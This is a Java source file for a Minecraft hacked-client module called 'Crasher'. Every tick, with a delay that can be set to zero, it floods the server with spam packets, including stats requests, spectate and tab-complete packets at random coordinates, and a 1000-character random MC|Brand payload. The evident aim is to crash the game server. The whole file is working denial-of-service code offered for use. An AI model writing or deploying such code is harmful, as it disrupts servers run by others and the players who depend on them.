package dev.zihasz.client.feature.module.player;

import dev.zihasz.client.feature.module.Category;
import dev.zihasz.client.feature.module.Module;
import dev.zihasz.client.feature.settings.Setting;
import dev.zihasz.client.feature.settings.SettingBuilder;
import dev.zihasz.client.utils.PacketUtils;
import dev.zihasz.client.utils.Timer;
import net.minecraft.network.play.client.*;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.TickEvent;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.commons.lang3.RandomUtils;

public class Crasher extends Module {

	private final Setting<Long> delay = new SettingBuilder<>(0L).name("Delay").description("Delay").range(0L, 1000L).build(this);
	private final Timer timer = new Timer();

	public Crasher() {
		super("Crasher", "Crasher", Category.PLAYER);
	}

	@SubscribeEvent
	public void onTick(TickEvent.ClientTickEvent event) {
		if (timer.passedMS(delay.getValue())) {
			mc.player.connection.sendPacket(new CPacketRecipeInfo(mc.player.ticksExisted % 2 == 1, mc.player.ticksExisted % 2 == 0));
			mc.player.connection.sendPacket(new CPacketClientStatus(CPacketClientStatus.State.REQUEST_STATS));
			mc.player.connection.sendPacket(new CPacketSpectate(mc.player.getGameProfile().getId()));
			mc.player.connection.sendPacket(new CPacketTabComplete("/kill ", mc.player.getPosition().add(RandomUtils.nextInt(100, 1000), RandomUtils.nextInt(100, 1000), RandomUtils.nextInt(100, 1000)), mc.player.ticksExisted % 5 == 0));
			mc.player.connection.sendPacket(new CPacketSteerBoat(mc.player.ticksExisted % 2 == 1, mc.player.ticksExisted % 2 == 0));
			mc.player.connection.sendPacket(PacketUtils.generatePayload("MC|Brand", RandomStringUtils.random(1000)));
			timer.reset();
		}

	}
}
